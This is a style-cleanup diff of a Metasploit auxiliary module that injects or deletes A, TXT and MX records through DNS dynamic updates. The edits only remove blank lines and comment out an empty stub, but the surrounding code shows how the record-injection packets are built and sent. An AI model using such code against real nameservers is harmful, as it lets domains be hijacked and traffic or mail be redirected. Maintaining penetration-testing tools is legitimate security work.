@@ -38,7 +38,6 @@ class MetasploitModule < Msf::Auxiliary
             OptAddress.new('INJECTIP', [true, 'The IP you want to assign to the injected record']),
             OptEnum.new('TYPE',  [true, 'The record type you want to inject.', 'A', ['A', 'CNAME', 'TXT', 'MX']])
         ], self.class)
-    
     register_advanced_options([
                                   OptString.new('TXTSTRING', [true, 'The string to be injected with TXT record', 'w00t'])
                               ])
@@ -47,7 +46,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def a_record(action)
-    
     # Send the update to the zone's primary master.
     resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
     # Create the update packet.
@@ -76,20 +74,14 @@ class MetasploitModule < Msf::Auxiliary
           vprint_error "Update failed: #{e}"
         end
     end
-    
   end
-
-
-  def cname_record(action)
-  
-    case
-      when action == 'ADD'
-        
-      when action == 'DEL'
-    end
-    
-  end
-  
+  #
+  # def cname_record(action)
+  #   case
+  #     when action == 'ADD'
+  #     when action == 'DEL'
+  #   end
+  # end
   def txt_record(action)
     resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
     update   = Dnsruby::Update.new(datastore['DOMAIN'])
@@ -116,22 +108,17 @@ class MetasploitModule < Msf::Auxiliary
           vprint_error "Update failed: #{e}"
         end
     end
-    
   end
 
   def mx_record(action)
-  
     resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
     update   = Dnsruby::Update.new(datastore['DOMAIN'])
     case
       when action == 'ADD'
-        
         # Add A record for MX record
         a_record(action) rescue $!.class == Dnsruby::YXRRSet  # Avoid 'a_record' exception and keep going
-        
         update.present(datastore['INJECTDOMAIN'])
         update.add(datastore['INJECTDOMAIN'], Dnsruby::Types.MX, 10, datastore['INJECTDOMAIN'])
-        
         begin
           resolver.send_message(update)
           print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been added!")
@@ -150,13 +137,10 @@ class MetasploitModule < Msf::Auxiliary
           vprint_error "Update failed: #{e}"
         end
     end
-
   end
-  
-  
+  # Run
   def run
     print_status("Sending DNS query payload...")
-    
     case
     when datastore['TYPE'] == 'A'
       a_record(action.name)
